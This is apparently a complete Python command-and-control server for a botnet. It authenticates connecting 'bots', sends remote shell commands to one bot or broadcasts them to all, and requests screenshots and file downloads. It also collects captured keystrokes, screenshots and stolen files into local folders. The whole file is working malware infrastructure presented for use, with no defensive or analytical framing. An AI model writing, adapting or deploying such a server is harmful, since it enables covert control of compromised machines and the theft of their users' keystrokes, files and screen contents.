import socket
import threading
import json
import os
import sys
import base64
import hashlib
import struct
import time
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

CONFIG_FILE = "c2_config.json"
KEY_FILE = "c2_key.key"
DATA_DIR = "c2_data"

class C2Server:
    def __init__(self, host="0.0.0.0", port=4443, password="default_pass"):
        self.host = host
        self.port = port
        self.password = password
        self.server_socket = None
        self.running = False
        self.bots = {}
        self.bot_id_counter = 0
        self.lock = threading.Lock()
        self.cipher = None
        self.init_crypto()
        self.init_data_dir()

    def init_crypto(self):
        key_path = os.path.join(DATA_DIR, KEY_FILE)
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                key = f.read()
        else:
            salt = os.urandom(16)
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=480000)
            key = base64.urlsafe_b64encode(kdf.derive(self.password.encode()))
            os.makedirs(DATA_DIR, exist_ok=True)
            with open(key_path, "wb") as f:
                f.write(key)
        self.cipher = Fernet(key)

    def init_data_dir(self):
        os.makedirs(DATA_DIR, exist_ok=True)
        os.makedirs(os.path.join(DATA_DIR, "screenshots"), exist_ok=True)
        os.makedirs(os.path.join(DATA_DIR, "keystrokes"), exist_ok=True)
        os.makedirs(os.path.join(DATA_DIR, "files"), exist_ok=True)

    def encrypt(self, data):
        return self.cipher.encrypt(data if isinstance(data, bytes) else data.encode())

    def decrypt(self, data):
        return self.cipher.decrypt(data)

    def send_packet(self, conn, data_type, payload):
        packet = json.dumps({"type": data_type, "payload": payload})
        encrypted = self.encrypt(packet)
        header = struct.pack("!I", len(encrypted))
        conn.sendall(header + encrypted)

    def recv_packet(self, conn):
        header = conn.recv(4)
        if not header or len(header) < 4:
            return None, None
        data_len = struct.unpack("!I", header)[0]
        encrypted = b""
        while len(encrypted) < data_len:
            chunk = conn.recv(data_len - len(encrypted))
            if not chunk:
                return None, None
            encrypted += chunk
        try:
            decrypted = self.decrypt(encrypted)
            packet = json.loads(decrypted)
            return packet.get("type"), packet.get("payload")
        except Exception:
            return None, None

    def handle_bot(self, conn, addr):
        bot_id = None
        try:
            auth_data = conn.recv(1024).decode().strip()
            if auth_data != self.password:
                conn.send(b"AUTH_FAIL")
                conn.close()
                return
            conn.send(b"AUTH_OK")

            with self.lock:
                self.bot_id_counter += 1
                bot_id = f"BOT-{self.bot_id_counter:04d}"
                self.bots[bot_id] = {
                    "conn": conn,
                    "addr": addr,
                    "connected_at": datetime.now().isoformat(),
                    "last_seen": time.time(),
                    "info": {},
                    "alive": True
                }

            self.send_packet(conn, "ping", {"msg": "connected"})

            while self.running:
                data_type, payload = self.recv_packet(conn)
                if data_type is None:
                    break

                with self.lock:
                    if bot_id in self.bots:
                        self.bots[bot_id]["last_seen"] = time.time()

                if data_type == "pong":
                    pass
                elif data_type == "info":
                    with self.lock:
                        if bot_id in self.bots:
                            self.bots[bot_id]["info"] = payload
                    self.log(f"[{bot_id}] Info received: {payload.get('hostname', '?')}")
                elif data_type == "result":
                    self.log(f"[{bot_id}] Command result:\n{payload}")
                elif data_type == "screenshot":
                    self.handle_screenshot(bot_id, payload)
                elif data_type == "keystrokes":
                    self.handle_keystrokes(bot_id, payload)
                elif data_type == "file":
                    self.handle_file(bot_id, payload)
                else:
                    self.log(f"[{bot_id}] Unknown packet: {data_type}")

        except Exception as e:
            self.log(f"[{addr}] Error: {e}")
        finally:
            with self.lock:
                if bot_id and bot_id in self.bots:
                    self.bots[bot_id]["alive"] = False
                    del self.bots[bot_id]
            self.log(f"[{bot_id or addr}] Disconnected")
            try:
                conn.close()
            except:
                pass

    def handle_screenshot(self, bot_id, payload):
        img_data = base64.b64decode(payload["data"])
        filename = f"screenshot_{bot_id}_{int(time.time())}.png"
        filepath = os.path.join(DATA_DIR, "screenshots", filename)
        with open(filepath, "wb") as f:
            f.write(img_data)
        self.log(f"[{bot_id}] Screenshot saved: {filepath}")

    def handle_keystrokes(self, bot_id, payload):
        filename = f"keys_{bot_id}_{int(time.time())}.txt"
        filepath = os.path.join(DATA_DIR, "keystrokes", filename)
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(f"\n--- {datetime.now().isoformat()} ---\n")
            f.write(payload["data"])
        self.log(f"[{bot_id}] Keystrokes appended")

    def handle_file(self, bot_id, payload):
        filename = payload.get("filename", "unknown")
        file_data = base64.b64decode(payload["data"])
        filepath = os.path.join(DATA_DIR, "files", f"{bot_id}_{filename}")
        with open(filepath, "wb") as f:
            f.write(file_data)
        self.log(f"[{bot_id}] File received: {filepath}")

    def broadcast(self, data_type, payload, exclude=None):
        with self.lock:
            for bid, bot in list(self.bots.items()):
                if bid == exclude:
                    continue
                try:
                    self.send_packet(bot["conn"], data_type, payload)
                except:
                    bot["alive"] = False

    def send_to_bot(self, bot_id, data_type, payload):
        with self.lock:
            bot = self.bots.get(bot_id)
            if not bot:
                return False
            try:
                self.send_packet(bot["conn"], data_type, payload)
                return True
            except:
                bot["alive"] = False
                return False

    def list_bots(self):
        with self.lock:
            if not self.bots:
                return "No bots connected."
            lines = []
            lines.append(f"{'ID':<12} {'Hostname':<20} {'IP':<20} {'OS':<15} {'Last Seen':<20}")
            lines.append("-" * 90)
            for bid, bot in self.bots.items():
                info = bot.get("info", {})
                hostname = info.get("hostname", "?")
                ip = info.get("ip", bot["addr"][0])
                os_info = info.get("os", "?")
                last_seen = datetime.fromtimestamp(bot["last_seen"]).strftime("%H:%M:%S")
                lines.append(f"{bid:<12} {hostname:<20} {ip:<20} {os_info:<15} {last_seen:<20}")
            return "\n".join(lines)

    def log(self, msg):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {msg}")

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)
        self.running = True
        self.log(f"C2 Server listening on {self.host}:{self.port}")

        accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
        accept_thread.start()
        self.command_loop()

    def accept_loop(self):
        while self.running:
            try:
                conn, addr = self.server_socket.accept()
                self.log(f"Incoming connection from {addr}")
                handler = threading.Thread(target=self.handle_bot, args=(conn, addr), daemon=True)
                handler.start()
            except:
                break

    def command_loop(self):
        print("\nC2 Console. Type 'help' for commands.\n")
        while self.running:
            try:
                cmd = input("c2> ").strip()
                if not cmd:
                    continue
                self.process_command(cmd)
            except KeyboardInterrupt:
                print("\nShutting down...")
                self.running = False
            except EOFError:
                self.running = False

    def process_command(self, cmd):
        parts = cmd.split(maxsplit=1)
        base = parts[0].lower() if parts else ""
        arg = parts[1] if len(parts) > 1 else ""

        if base == "help":
            print("""
Commands:
  help                           - Show this help
  list                           - List connected bots
  use <bot_id>                   - Interactive mode with specific bot
  exec <bot_id> <command>        - Execute command on bot
  shell <bot_id>                 - Interactive shell on bot
  screenshot <bot_id>            - Take screenshot
  download <bot_id> <path>       - Download file from bot
  broadcast <command>            - Execute command on ALL bots
  info <bot_id>                  - Get detailed bot info
  kill <bot_id>                  - Disconnect bot
  exit/quit                      - Shutdown server
            """)

        elif base == "list":
            print(self.list_bots())

        elif base == "use":
            if not arg:
                print("Usage: use <bot_id>")
                return
            self.interactive_bot(arg)

        elif base == "exec":
            parts = arg.split(maxsplit=1)
            if len(parts) < 2:
                print("Usage: exec <bot_id> <command>")
                return
            bot_id, command = parts
            if self.send_to_bot(bot_id, "exec", {"cmd": command}):
                print(f"Command sent to {bot_id}")

        elif base == "shell":
            if not arg:
                print("Usage: shell <bot_id>")
                return
            self.interactive_shell(arg)

        elif base == "screenshot":
            if not arg:
                print("Usage: screenshot <bot_id>")
                return
            if self.send_to_bot(arg, "screenshot", {}):
                print(f"Screenshot requested from {arg}")

        elif base == "download":
            parts = arg.split(maxsplit=1)
            if len(parts) < 2:
                print("Usage: download <bot_id> <path>")
                return
            bot_id, path = parts
            if self.send_to_bot(bot_id, "download", {"path": path}):
                print(f"Download request sent to {bot_id} for {path}")

        elif base == "broadcast":
            if not arg:
                print("Usage: broadcast <command>")
                return
            self.broadcast("exec", {"cmd": arg})
            print(f"Broadcasted: {arg}")

        elif base == "info":
            if not arg:
                print("Usage: info <bot_id>")
                return
            with self.lock:
                bot = self.bots.get(arg)
                if not bot:
                    print(f"Bot {arg} not found")
                    return
                info = bot.get("info", {})
                print(f"Bot ID: {arg}")
                print(f"Address: {bot['addr'][0]}:{bot['addr'][1]}")
                print(f"Connected: {bot['connected_at']}")
                for k, v in info.items():
                    print(f"  {k}: {v}")

        elif base == "kill":
            if not arg:
                print("Usage: kill <bot_id>")
                return
            with self.lock:
                bot = self.bots.get(arg)
                if bot:
                    try:
                        bot["conn"].close()
                    except:
                        pass
                    del self.bots[arg]
                    print(f"{arg} killed")

        elif base in ("exit", "quit"):
            self.running = False

        else:
            print(f"Unknown command: {base}")

    def interactive_bot(self, bot_id):
        print(f"Interactive mode with {bot_id}. Type 'exit' to leave.")
        with self.lock:
            if bot_id not in self.bots:
                print(f"Bot {bot_id} not found")
                return
        while True:
            try:
                cmd = input(f"{bot_id}> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    break
                if cmd.lower().startswith("screenshot"):
                    self.send_to_bot(bot_id, "screenshot", {})
                elif cmd.lower().startswith("download "):
                    _, path = cmd.split(maxsplit=1)
                    self.send_to_bot(bot_id, "download", {"path": path})
                else:
                    self.send_to_bot(bot_id, "exec", {"cmd": cmd})
            except KeyboardInterrupt:
                break

    def interactive_shell(self, bot_id):
        print(f"Remote shell on {bot_id}. Type 'exit' to leave.")
        with self.lock:
            if bot_id not in self.bots:
                print(f"Bot {bot_id} not found")
                return
        while True:
            try:
                cmd = input(f"shell/{bot_id}> ").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    break
                self.send_to_bot(bot_id, "exec", {"cmd": cmd})
            except KeyboardInterrupt:
                break

    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        with self.lock:
            for bid, bot in self.bots.items():
                try:
                    bot["conn"].close()
                except:
                    pass
            self.bots.clear()


def main():
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), CONFIG_FILE)

    if os.path.exists(config_path):
        with open(config_path) as f:
            cfg = json.load(f)
        host = cfg.get("host", "0.0.0.0")
        port = cfg.get("port", 4443)
        password = cfg.get("password", "default_pass")
    else:
        host = "0.0.0.0"
        port = 4443
        password = "default_pass"
        with open(config_path, "w") as f:
            json.dump({"host": host, "port": port, "password": password}, f, indent=2)
        print(f"Created default config: {config_path}")

    server = C2Server(host, port, password)
    try:
        server.start()
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()
        print("Server stopped.")


if __name__ == "__main__":
    main()
